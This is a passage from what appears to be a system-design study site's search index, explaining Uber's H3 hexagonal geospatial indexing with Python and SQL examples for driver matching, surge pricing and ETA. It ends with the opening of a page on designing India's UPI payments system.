\u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 1-4  \u2502   4     \u2502 Reserved \u2502 Mode (1 for hexagon cells)          \u2502\n\u2502 5-7  \u2502   3     \u2502 Reserved \u2502 Edge/Vertex mode                    \u2502\n\u2502 8-11 \u2502   4     \u2502 Resolution\u2502 0-15 (hierarchy level)             \u2502\n\u250212-64 \u2502  53     \u2502 Base Cell\u2502 Base cell + direction encoding     \u2502\n\u2502      \u2502         \u2502 + Digits \u2502 (7 children per parent)             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nExample H3 Index:\n  8928308280fffff (hex) = 613196570357600255 (decimal)\n\n  Resolution: 9 (city block level)\n  Base Cell: 20\n  Location: San Francisco, CA area\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#string-representation","title":"String Representation","text":"<pre><code># H3 can be represented as:\n\n# 1. 64-bit integer\nh3_int = 613196570357600255\n\n# 2. Hexadecimal string (15 characters)\nh3_hex = \"8928308280fffff\"\n\n# 3. Lat/Lng coordinates\nlat, lng = 37.7749, -122.4194  # San Francisco\n\n# Conversion\nimport h3\n\n# Lat/Lng to H3\nh3_index = h3.geo_to_h3(lat, lng, resolution=9)\n# Output: \"8928308280fffff\"\n\n# H3 to Lat/Lng (center of hexagon)\nlat, lng = h3.h3_to_geo(h3_index)\n# Output: (37.77492679761899, -122.41925358439409)\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#how-uber-uses-h3","title":"How Uber Uses H3","text":""},{"location":"system-design/high-level/desgining/uber/#1-matching-riders-with-drivers","title":"1. Matching Riders with Drivers","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    Rider Requests Ride                          \u2502\n\u2502                    Location: (37.7749, -122.4194)              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                       \u2502\n                       \u25bc\n            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n            \u2502  Convert to H3 Index \u2502\n            \u2502  Resolution: 9       \u2502\n            \u2502  h3 = \"8928308280f\"  \u2502\n            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                       \u2502\n                       \u25bc\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n         \u2502  Find Nearby H3 Cells (k-ring)  \u2502\n         \u2502                                  \u2502\n         \u2502     ___     ___     ___          \u2502\n         \u2502    /   \\   / 2 \\   /   \\         \u2502\n         \u2502   / 3  \\__/    \\__/ 4  \\         \u2502\n         \u2502   \\     /  \\ 1  /  \\     /       \u2502\n         \u2502    \\___/ 6 \\___/ 5 \\___/         \u2502\n         \u2502    /   \\     / 0 \\     /         \u2502\n         \u2502   / 8  \\___/ \ud83d\ude97  \\___/           \u2502\n         \u2502   \\     /   \\     /              \u2502\n         \u2502    \\___/ 7  \\___/                \u2502\n         \u2502                                  \u2502\n         \u2502  k=2 ring = 19 hexagons          \u2502\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                      \u2502\n                      \u25bc\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n         \u2502  Query Database for Drivers    \u2502\n         \u2502  in these 19 hexagons:         \u2502\n         \u2502                                 \u2502\n         \u2502  SELECT * FROM drivers          \u2502\n         \u2502  WHERE h3_cell IN (             \u2502\n         \u2502    '8928308280f',               \u2502\n         \u2502    '892830828af',               \u2502\n         \u2502    '892830828bf',               \u2502\n         \u2502    ...                          \u2502\n         \u2502  )                              \u2502\n         \u2502  AND status = 'available'       \u2502\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                       \u2502\n                       \u25bc\n         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n         \u2502  Match Closest Available Driver\u2502\n         \u2502                                 \u2502\n         \u2502  Rider \ud83d\udeb6: (37.7749, -122.419) \u2502\n         \u2502  Driver \ud83d\ude97: (37.7755, -122.418)\u2502\n         \u2502  Distance: ~150 meters          \u2502\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#2-demandsupply-heatmaps-surge-pricing","title":"2. Demand/Supply Heatmaps (Surge Pricing)","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           Real-time Demand Aggregation (Res 7)              \u2502\n\u2502                                                              \u2502\n\u2502    ___     ___     ___     ___     ___     ___              \u2502\n\u2502   /   \\   /   \\   /   \\   /   \\   /   \\   /   \\             \u2502\n\u2502  / \ud83d\udeb6  \\_/ \ud83d\udeb6  \\_/\ud83d\udeb6\ud83d\udeb6 \\_/ \ud83d\udeb6  \\_/     \\_/     \\            \u2502\n\u2502  \\ 2   /  \\ 3   / \\\ud83d\udeb6\ud83d\udeb6 / \\ 4   /  \\ 1   /  \\ 0   /         \u2502\n\u2502   \\___/ \ud83d\udeb6 \\___/\ud83d\udeb6 \\___/   \\___/    \\___/    \\___/          \u2502\n\u2502   /   \\     /   \\     /   \\     /   \\     /   \\             \u2502\n\u2502  / \ud83d\udeb6  \\___/ \ud83d\udeb6\ud83d\udeb6 \\___/     \\___/     \\___/     \\            \u2502\n\u2502  \\ 5   /   \\\ud83d\udeb6\ud83d\udeb6\ud83d\udeb6/   \\ 2   /   \\ 1   /   \\ 0   /            \u2502\n\u2502   \\___/     \\___/     \\___/     \\___/     \\___/             \u2502\n\u2502   /   \\     /   \\     /   \\     /   \\     /   \\             \u2502\n\u2502  /     \\___/\ud83d\ude97\ud83d\ude97 \\___/     \\___/     \\___/     \\             \u2502\n\u2502  \\ 1   /   \\\ud83d\ude97\ud83d\ude97 /   \\ 2   /   \\ 3   /   \\ 1   /             \u2502\n\u2502   \\___/     \\___/     \\___/     \\___/     \\___/             \u2502\n\u2502                                                              \u2502\n\u2502  Hexagon Analysis:                                          \u2502\n\u2502  \u2022 High demand (5+ riders): RED (surge pricing 2.5x)        \u2502\n\u2502  \u2022 Medium demand (2-4): YELLOW (surge 1.5x)                 \u2502\n\u2502  \u2022 Low supply + high demand: Notify nearby drivers          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nAlgorithm:\n1. Group riders by H3 cell (resolution 7 = ~1.2km)\n2. Count riders per hexagon\n3. Count available drivers per hexagon\n4. Calculate demand/supply ratio\n5. Apply surge pricing to high-demand cells\n6. Update pricing every 30 seconds\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#3-eta-calculation-with-traffic-patterns","title":"3. ETA Calculation with Traffic Patterns","text":"<pre><code># Store historical traffic data by H3 cell and time\ntraffic_data = {\n    '8728308280fffff': {  # H3 cell\n        'monday_8am': {\n            'avg_speed': 25,  # km/h\n            'avg_delay': 120  # seconds\n        },\n        'friday_6pm': {\n            'avg_speed': 10,  # km/h (rush hour)\n            'avg_delay': 480  # seconds\n        }\n    }\n}\n\n# Calculate ETA\ndef calculate_eta(start_lat, start_lng, end_lat, end_lng, current_time):\n    # 1. Get route as sequence of H3 cells\n    route_cells = get_route_h3_cells(start_lat, start_lng, end_lat, end_lng)\n\n    # 2. For each cell, get traffic conditions\n    total_time = 0\n    for cell in route_cells:\n        traffic = get_traffic_data(cell, current_time)\n        cell_distance = get_cell_distance(cell)\n        time = cell_distance / traffic['avg_speed']\n        total_time += time + traffic['avg_delay']\n\n    return total_time\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#4-driver-positioning-optimization","title":"4. Driver Positioning &amp; Optimization","text":"<pre><code>Idle Driver Repositioning (reduce pickup time):\n\nCurrent State:\n    ___     ___     ___\n   /   \\   /   \\   /   \\\n  /  \ud83d\ude97  \\_/  \ud83d\ude97  \\_/  \ud83d\ude97  \\     High driver concentration\n  \\     /  \\     /  \\     /     Low demand area\n   \\___/    \\___/    \\___/\n\n    ___     ___     ___\n   /   \\   /   \\   /   \\\n  / \ud83d\udeb6\ud83d\udeb6 \\_/ \ud83d\udeb6\ud83d\udeb6 \\_/ \ud83d\udeb6\ud83d\udeb6 \\     High demand area\n  \\     /  \\     /  \\     /     No drivers nearby\n   \\___/    \\___/    \\___/\n\nUber's Algorithm:\n1. Identify high-demand H3 cells with no drivers\n2. Find nearest idle drivers (using k-ring search)\n3. Send \"suggested pickup zone\" notification\n4. Incentivize drivers to move (bonus $5 for next ride)\n\nOptimized State:\n    ___     ___     ___\n   /   \\   /   \\   /   \\\n  /     \\_/  \ud83d\ude97  \\_/     \\     Balanced distribution\n  \\     /  \\     /  \\     /\n   \\___/    \\___/    \\___/\n\n    ___     ___     ___\n   /   \\   /   \\   /   \\\n  / \ud83d\udeb6\ud83d\udeb6 \\_/ \ud83d\ude97\ud83d\ude97 \\_/ \ud83d\udeb6\ud83d\udeb6 \\     Drivers in demand area\n  \\     /  \\     /  \\     /     Reduced pickup time\n   \\___/    \\___/    \\___/\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#h3-operations-examples","title":"H3 Operations &amp; Examples","text":""},{"location":"system-design/high-level/desgining/uber/#python-implementation","title":"Python Implementation","text":"<p>Installation: <pre><code>pip install h3\n</code></pre></p> <p>Basic Operations: <pre><code>import h3\n\n# 1. Convert lat/lng to H3 index\nlat, lng = 37.7749, -122.4194  # San Francisco\nresolution = 9  # City block level\n\nh3_index = h3.geo_to_h3(lat, lng, resolution)\nprint(f\"H3 Index: {h3_index}\")\n# Output: \"8928308280fffff\"\n\n# 2. Convert H3 index back to lat/lng (center)\ncenter_lat, center_lng = h3.h3_to_geo(h3_index)\nprint(f\"Center: ({center_lat}, {center_lng})\")\n\n# 3. Get hexagon boundary (vertices)\nboundary = h3.h3_to_geo_boundary(h3_index)\nprint(f\"Boundary (6 vertices): {boundary}\")\n# Output: [(37.775, -122.419), (37.776, -122.418), ...]\n\n# 4. Find neighboring hexagons (k-ring)\n# k=1 means immediate neighbors (6 hexagons)\nneighbors = h3.k_ring(h3_index, k=1)\nprint(f\"Neighbors (k=1): {len(neighbors)} hexagons\")\n# Output: 7 hexagons (center + 6 neighbors)\n\nneighbors = h3.k_ring(h3_index, k=2)\nprint(f\"Neighbors (k=2): {len(neighbors)} hexagons\")\n# Output: 19 hexagons (center + 6 + 12)\n\n# 5. Get parent (lower resolution)\nparent = h3.h3_to_parent(h3_index, res=7)\nprint(f\"Parent (res 7): {parent}\")\n\n# 6. Get children (higher resolution)\nchildren = h3.h3_to_children(h3_index, res=11)\nprint(f\"Children (res 11): {len(children)} hexagons\")\n# Output: ~49 hexagons (7^2)\n\n# 7. Calculate distance between two H3 cells\nh3_sf = h3.geo_to_h3(37.7749, -122.4194, 9)  # San Francisco\nh3_oak = h3.geo_to_h3(37.8044, -122.2712, 9)  # Oakland\ndistance = h3.h3_distance(h3_sf, h3_oak)\nprint(f\"Grid distance: {distance} hexagons\")\n\n# 8. Get all hexagons in a polygon\npolygon = [\n    [37.77, -122.43],\n    [37.78, -122.41],\n    [37.76, -122.40],\n    [37.77, -122.43]  # Close the polygon\n]\nhexagons = h3.polyfill(polygon, res=9)\nprint(f\"Hexagons in polygon: {len(hexagons)}\")\n</code></pre></p>"},{"location":"system-design/high-level/desgining/uber/#finding-nearby-drivers-real-example","title":"Finding Nearby Drivers (Real Example)","text":"<pre><code>import h3\nfrom dataclasses import dataclass\nfrom typing import List\n\n@dataclass\nclass Driver:\n    id: str\n    lat: float\n    lng: float\n    h3_cell: str\n    status: str\n\n# Simulated driver database\ndrivers = [\n    Driver(\"D1\", 37.7750, -122.4195, \"\", \"available\"),\n    Driver(\"D2\", 37.7755, -122.4180, \"\", \"available\"),\n    Driver(\"D3\", 37.7760, -122.4200, \"\", \"busy\"),\n    Driver(\"D4\", 37.7800, -122.4250, \"\", \"available\"),\n]\n\n# Pre-compute H3 cells for all drivers\nRESOLUTION = 9\nfor driver in drivers:\n    driver.h3_cell = h3.geo_to_h3(driver.lat, driver.lng, RESOLUTION)\n\ndef find_nearby_drivers(rider_lat: float, rider_lng: float, \n                       max_distance_km: float = 2.0) -&gt; List[Driver]:\n    \"\"\"\n    Find available drivers near the rider using H3.\n\n    Args:\n        rider_lat: Rider's latitude\n        rider_lng: Rider's longitude\n        max_distance_km: Maximum search radius in km\n\n    Returns:\n        List of available drivers sorted by distance\n    \"\"\"\n    # 1. Convert rider location to H3\n    rider_h3 = h3.geo_to_h3(rider_lat, rider_lng, RESOLUTION)\n\n    # 2. Calculate k-ring size based on max distance\n    # Resolution 9 has ~174m edge length\n    # k=1 covers ~0.52 km, k=2 covers ~1.04 km, k=3 covers ~1.56 km\n    k = max(1, int(max_distance_km / 0.52))\n\n    # 3. Get all H3 cells within search radius\n    search_cells = h3.k_ring(rider_h3, k)\n    print(f\"Searching in {len(search_cells)} hexagons (k={k})\")\n\n    # 4. Filter drivers in these cells\n    nearby_drivers = []\n    for driver in drivers:\n        if driver.status == \"available\" and driver.h3_cell in search_cells:\n            # Calculate actual distance\n            distance = haversine(\n                rider_lat, rider_lng,\n                driver.lat, driver.lng\n            )\n            nearby_drivers.append((driver, distance))\n\n    # 5. Sort by distance\n    nearby_drivers.sort(key=lambda x: x[1])\n\n    return [(driver, f\"{dist:.2f} km\") for driver, dist in nearby_drivers]\n\ndef haversine(lat1, lng1, lat2, lng2):\n    \"\"\"Calculate distance between two points in km.\"\"\"\n    from math import radians, sin, cos, sqrt, atan2\n\n    R = 6371  # Earth radius in km\n    dlat = radians(lat2 - lat1)\n    dlng = radians(lng2 - lng1)\n\n    a = sin(dlat/2)**2 + cos(radians(lat1)) * cos(radians(lat2)) * sin(dlng/2)**2\n    c = 2 * atan2(sqrt(a), sqrt(1-a))\n\n    return R * c\n\n# Example usage\nrider_location = (37.7749, -122.4194)\nnearby = find_nearby_drivers(*rider_location, max_distance_km=1.0)\n\nprint(\"\\nNearby Available Drivers:\")\nfor driver, distance in nearby:\n    print(f\"  {driver.id}: {distance} away\")\n\n# Output:\n# Searching in 19 hexagons (k=2)\n# Nearby Available Drivers:\n#   D1: 0.06 km away\n#   D2: 0.17 km away\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#demand-heatmap-generation","title":"Demand Heatmap Generation","text":"<pre><code>import h3\nfrom collections import defaultdict\nfrom datetime import datetime\n\ndef generate_demand_heatmap(ride_requests: List[tuple], resolution: int = 7):\n    \"\"\"\n    Generate demand heatmap from ride requests.\n\n    Args:\n        ride_requests: List of (lat, lng, timestamp) tuples\n        resolution: H3 resolution (7 = neighborhood level)\n\n    Returns:\n        Dictionary mapping H3 cells to demand count\n    \"\"\"\n    demand_map = defaultdict(int)\n\n    # Aggregate requests by H3 cell\n    for lat, lng, timestamp in ride_requests:\n        h3_cell = h3.geo_to_h3(lat, lng, resolution)\n        demand_map[h3_cell] += 1\n\n    # Sort by demand (descending)\n    sorted_demand = sorted(\n        demand_map.items(), \n        key=lambda x: x[1], \n        reverse=True\n    )\n\n    return dict(sorted_demand)\n\ndef calculate_surge_pricing(demand_map: dict, supply_map: dict):\n    \"\"\"\n    Calculate surge pricing multiplier based on demand/supply.\n\n    Args:\n        demand_map: H3 cell -&gt; number of ride requests\n        supply_map: H3 cell -&gt; number of available drivers\n\n    Returns:\n        Dictionary mapping H3 cells to surge multiplier\n    \"\"\"\n    surge_map = {}\n\n    for h3_cell, demand in demand_map.items():\n        supply = supply_map.get(h3_cell, 0)\n\n        if supply == 0:\n            surge_multiplier = 3.0  # Max surge\n        else:\n            ratio = demand / supply\n\n            if ratio &gt; 5:\n                surge_multiplier = 2.5\n            elif ratio &gt; 3:\n                surge_multiplier = 2.0\n            elif ratio &gt; 2:\n                surge_multiplier = 1.5\n            else:\n                surge_multiplier = 1.0\n\n        surge_map[h3_cell] = surge_multiplier\n\n    return surge_map\n\n# Example usage\nride_requests = [\n    (37.7749, -122.4194, datetime.now()),  # 3 requests\n    (37.7750, -122.4195, datetime.now()),  # in same\n    (37.7751, -122.4196, datetime.now()),  # neighborhood\n    (37.8044, -122.2712, datetime.now()),  # 1 request elsewhere\n]\n\nheatmap = generate_demand_heatmap(ride_requests, resolution=7)\nprint(\"Demand Heatmap:\")\nfor cell, count in list(heatmap.items())[:5]:\n    lat, lng = h3.h3_to_geo(cell)\n    print(f\"  {cell}: {count} requests at ({lat:.4f}, {lng:.4f})\")\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#advantages-of-h3-for-uber","title":"Advantages of H3 for Uber","text":""},{"location":"system-design/high-level/desgining/uber/#1-performance-benefits","title":"1. Performance Benefits","text":"<pre><code>Traditional Approach (Lat/Lng Queries):\n  Query: Find all drivers within 2km radius\n\n  SELECT * FROM drivers\n  WHERE \n    lat BETWEEN 37.754 AND 37.795 AND\n    lng BETWEEN -122.439 AND -122.399 AND\n    SQRT(POW(lat - 37.7749, 2) + POW(lng - 122.4194, 2)) &lt; 0.018\n\n  \u274c Problems:\n  - Expensive SQRT calculation for every row\n  - Inefficient bounding box (includes corners)\n  - Difficult to index efficiently\n  - Query time: ~500ms for 100K drivers\n\nH3 Approach:\n  Query: Find all drivers in k-ring hexagons\n\n  rider_h3 = h3.geo_to_h3(37.7749, -122.4194, 9)\n  search_cells = h3.k_ring(rider_h3, k=3)  # 37 hexagons\n\n  SELECT * FROM drivers\n  WHERE h3_cell IN (\n    '8928308280f', '892830828af', '892830828bf', ...\n  )\n\n  \u2705 Benefits:\n  - Simple indexed lookup (B-tree on h3_cell column)\n  - No expensive calculations\n  - Precise search area (hexagon coverage)\n  - Query time: ~5ms for 100K drivers (100x faster!)\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#2-storage-efficiency","title":"2. Storage Efficiency","text":"<pre><code>Driver Record Size:\n\nOld Schema:\n  id: UUID (16 bytes)\n  lat: DOUBLE (8 bytes)\n  lng: DOUBLE (8 bytes)\n  status: VARCHAR (10 bytes)\n  Total: 42 bytes per driver\n\nNew Schema with H3:\n  id: UUID (16 bytes)\n  h3_cell: BIGINT (8 bytes)  \u2190 Single field instead of lat/lng\n  status: VARCHAR (10 bytes)\n  Total: 34 bytes per driver\n\nSavings: 19% reduction\nFor 5 million drivers: ~40 MB saved\nIndex size: 60% smaller (single column vs. spatial index)\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#3-aggregation-analytics","title":"3. Aggregation &amp; Analytics","text":"<pre><code># Easy demand aggregation by geographic area\ndemand_by_neighborhood = \"\"\"\n    SELECT \n        h3_cell,\n        COUNT(*) as ride_count,\n        AVG(fare) as avg_fare,\n        AVG(trip_duration) as avg_duration\n    FROM rides\n    WHERE timestamp &gt; NOW() - INTERVAL '1 hour'\n    GROUP BY h3_cell\n    ORDER BY ride_count DESC\n    LIMIT 10\n\"\"\"\n\n# Find demand clusters (hot spots)\nclusters = \"\"\"\n    SELECT \n        h3_cell,\n        COUNT(*) as demand\n    FROM ride_requests\n    WHERE created_at &gt; NOW() - INTERVAL '15 minutes'\n    GROUP BY h3_cell\n    HAVING COUNT(*) &gt; 10  -- High demand threshold\n\"\"\"\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#4-data-visualization","title":"4. Data Visualization","text":"<pre><code>H3 hexagons can be directly rendered on maps:\n\nJavaScript (with Deck.gl):\nconst hexagonLayer = new H3HexagonLayer({\n  id: 'h3-hexagon-layer',\n  data: demandData,  // Array of {h3_cell, demand_count}\n  getHexagon: d =&gt; d.h3_cell,\n  getFillColor: d =&gt; getColorByDemand(d.demand_count),\n  getElevation: d =&gt; d.demand_count * 100,\n  elevationScale: 20,\n  pickable: true\n});\n\nResult: Beautiful 3D demand visualization\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#real-world-performance-uber-scale","title":"Real-World Performance (Uber Scale)","text":""},{"location":"system-design/high-level/desgining/uber/#database-schema","title":"Database Schema","text":"<pre><code>-- Drivers table with H3 indexing\nCREATE TABLE drivers (\n    driver_id UUID PRIMARY KEY,\n    name VARCHAR(100),\n    h3_cell_res9 BIGINT NOT NULL,  -- Resolution 9 (~174m)\n    h3_cell_res7 BIGINT,            -- Resolution 7 (~1.2km) for broader searches\n    status VARCHAR(20),\n    last_updated TIMESTAMP,\n    INDEX idx_h3_res9 (h3_cell_res9, status),\n    INDEX idx_h3_res7 (h3_cell_res7, status)\n);\n\n-- Rides table with route as H3 sequence\nCREATE TABLE rides (\n    ride_id UUID PRIMARY KEY,\n    pickup_h3 BIGINT,\n    dropoff_h3 BIGINT,\n    route_h3_cells BIGINT[],  -- Array of H3 cells along route\n    distance_km FLOAT,\n    duration_seconds INT,\n    fare DECIMAL(10, 2),\n    created_at TIMESTAMP,\n    INDEX idx_pickup_h3 (pickup_h3),\n    INDEX idx_dropoff_h3 (dropoff_h3)\n);\n\n-- Demand aggregation (pre-computed every 30 seconds)\nCREATE TABLE demand_supply (\n    h3_cell BIGINT PRIMARY KEY,\n    resolution INT,\n    demand_count INT,\n    supply_count INT,\n    surge_multiplier DECIMAL(3, 2),\n    updated_at TIMESTAMP,\n    INDEX idx_updated (updated_at)\n);\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#performance-metrics","title":"Performance Metrics","text":"<pre><code>Uber's Scale (approximate):\n- 5 million active drivers globally\n- 20 million riders\n- 100 million rides per month\n\nH3 Benefits at Scale:\n\n1. Driver Matching:\n   - Before H3: ~500-1000ms per match\n   - After H3: ~5-20ms per match\n   - Improvement: 50-100x faster\n\n2. Database Size:\n   - Before: 2.5 TB (with spatial indexes)\n   - After: 1.8 TB (with H3 indexes)\n   - Savings: 28% reduction\n\n3. Query Throughput:\n   - Before: ~5,000 queries/second (at 80% CPU)\n   - After: ~50,000 queries/second (at 40% CPU)\n   - Improvement: 10x throughput, 50% less CPU\n\n4. Heatmap Generation:\n   - Before: ~30 seconds (full scan + spatial grouping)\n   - After: ~0.5 seconds (simple GROUP BY h3_cell)\n   - Improvement: 60x faster\n</code></pre>"},{"location":"system-design/high-level/desgining/uber/#comparison-with-alternatives","title":"Comparison with Alternatives","text":"System Grid Type Encoding Levels Pros Cons H3 Hexagons 64-bit int 16 Uniform distance, efficient Slightly complex S2 (Google) Spherical squares 64-bit int 30 High precision Non-uniform distance Geohash Rectangles Base32 string Variable Simple, human-readable Square problems QuadTree Squares Hierarchical Variable Simple tree structure Non-uniform neighbors Lat/Lng Grid Rectangles Two floats N/A Universal standard Expensive queries <p>Winner: H3 for proximity-based services (ride-sharing, delivery) Alternative: S2 for global-scale applications (Google Maps uses S2)</p>"},{"location":"system-design/high-level/desgining/uber/#summary","title":"Summary","text":""},{"location":"system-design/high-level/desgining/uber/#key-takeaways","title":"Key Takeaways:","text":"<ol> <li>H3 = Hierarchical Hexagonal Geospatial Index</li> <li>Divides Earth into hexagons at 16 resolution levels</li> <li> <p>Each cell has unique 64-bit identifier</p> </li> <li> <p>Why Hexagons?</p> </li> <li>Equal distance to all 6 neighbors (uniform)</li> <li>Best circle approximation</li> <li> <p>Isotropic (no directional bias)</p> </li> <li> <p>Uber's Use Cases:</p> </li> <li>\u2705 Fast driver-rider matching (50-100x faster)</li> <li>\u2705 Demand heatmaps and surge pricing</li> <li>\u2705 ETA calculation with traffic patterns</li> <li> <p>\u2705 Driver repositioning optimization</p> </li> <li> <p>Performance Benefits:</p> </li> <li>\ud83d\ude80 Simple indexed queries (vs expensive spatial calculations)</li> <li>\ud83d\udcbe 28% database size reduction</li> <li>\u26a1 10x query throughput increase</li> <li> <p>\ud83d\udcca 60x faster analytics</p> </li> <li> <p>When to Use H3:</p> </li> <li>Proximity searches (find nearby X)</li> <li>Geospatial aggregation (heatmaps, clusters)</li> <li>Location-based matching</li> <li>Spatial analytics at scale</li> </ol> <p>Open Source: Available on GitHub (uber/h3) Supported Languages: Python, Java, JavaScript, Go, Rust, C</p>"},{"location":"system-design/high-level/desgining/upi-payments/","title":"Design UPI Payments System","text":""},{"location":"system-design/high-level/desgining/upi-payments/#youtube","title":"YouTube","text":"<ul> <li>System Design of UPI Payments</li> </ul>"},{"location":"system-design/high-level/desgining/upi-payments/#blogs","title":"Blogs","text":"<ul> <li>Designing UPI - System Design</li> <li>System Design: UPI (Unified Payment Interface)</li> <li>System Design for Unified Payments Interface (UPI)</li> <li>What is UPI? Unified Payments Interface Features and How UPI Works</li> </ul>"},{"location":"system-design/high-level/desgining/upi-payments/#medium","title":"Medium","text":"<ul> <li>UPI System Design</li> <li>Technical Flow of Unified Payment Interface P2P Payments</li> </ul>"},{"location":"system-design/high-level/desgining/upi-payments/#theory","title":"Theory","text":""},{"location":"system-design/high-level/desgining/upi-payments/#key-concepts","title":"Key Concepts","text":"<ul> <li> <p>VPA (Virtual Payment Address):     A unique identifier for users in the UPI ecosystem, e.g., <code>username@bank</code>. It abstracts away sensitive bank details.</p> </li> <li> <p>Bank Account Details:     Traditionally, to transfer money, you need:</p> <ul> <li>Account Number</li> <li>Bank Name</li> <li>Branch Code</li> <li>IFSC Code</li> </ul> </li> <li> <p>Payment Methods in India:</p> <ul> <li>IMPS (Immediate Payment Service): Real-time, 24x7, instant fund transfer.</li> <li>NEFT (National Electronic Funds Transfer): Batch-processed, may take some time, uses UTR number, has amount limits.</li> <li>RTGS (Real Time Gross Settlement): Real-time, for large-value transactions.</li> <li>UPI (Unified Payments Interface): Real-time, instant, works 24x7, abstracts bank details using VPA.</li> </ul> </li> </ul>"},{"location":"system-design/high-level/desgining/upi-payments/#upi-architecture","title":"UPI Architecture","text":"<ul> <li> <p>NPCI (National Payments Corporation of India):     Governs and operates the UPI infrastructure. Only authorized banks can access NPCI APIs.</p> </li> <li> <p>Banks:     Must be authorized by RBI and 